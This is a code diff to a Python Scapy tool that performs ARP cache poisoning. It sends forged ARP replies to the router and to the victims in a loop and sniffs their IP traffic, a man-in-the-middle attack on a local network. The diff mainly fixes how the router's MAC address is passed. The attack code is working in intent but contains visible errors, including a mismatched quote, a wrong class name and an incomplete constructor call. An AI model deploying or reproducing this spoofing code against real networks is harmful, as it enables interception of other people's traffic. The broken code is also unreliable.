@@ -64,8 +64,9 @@ class PreAttack(object):
 		return srp(Ether(dst="ff:ff:ff:ff:ff:ff')/ARP(pdst=self.target),timeout=10, iface=self.interface)[0][0][1][ARP].hwsrc
 
 class Attack(object):
-	def __init__(self, router, targets, interface):
-		self.router = router
+	def __init__(self, routerip, routermac, targets, interface):
+		self.routerip = routerip
+		self.routermac = routermac
 		self.targets = targets 
 		self.interface = interface
 	def send_Poison(self, my_Mac):
@@ -75,8 +76,8 @@ class Attack(object):
 			arp1[Ether].src = my_Mac #attacking MAC address
 			arp1[ARP].hwsrc = my_Mac #attacking MAC address
 			arp1[ARP].psrc = self.targets[i].IP #IP to Spoof
-			arp1[ARP].hwdst = self.targets[0].MAC
-			arp1[ARP].pdst = self.router
+			arp1[ARP].hwdst = self.routermac
+			arp1[ARP].pdst = self.routerip
 			sendp(arp1, iface = self.interface)
 			#arp to spoof the router, send to victim
 			arp2 = Ether() / ARP()
@@ -138,6 +139,7 @@ if __name__ == '__main__':
 		targets = PrePreAttack().get_IP_Addrs(IP_router.src)
 	#	print(targets[0])
 		try:
+			MAC_router = PreAttack(IP_router.src).get_MAC_Addr()
 			for i in range(0, len(targets)):
 				targets[i].MAC=PreAttack(targets[i].IP, interface).get_MAC_Addr()
 		except Exception:
@@ -145,7 +147,7 @@ if __name__ == '__main__':
 
 		while True:
 			try:
-				Attacks(IP_router.src, targets, interface).send_Poison(my_Mac_Addr)
+				Attacks(IP_router.src, MAC_router, targets, interface).send_Poison(my_Mac_Addr)
 				#sleep(3)
 				sniff(filter="ip", prn=PostAttack(targets).track_packet, count=10)
 			except Exception:
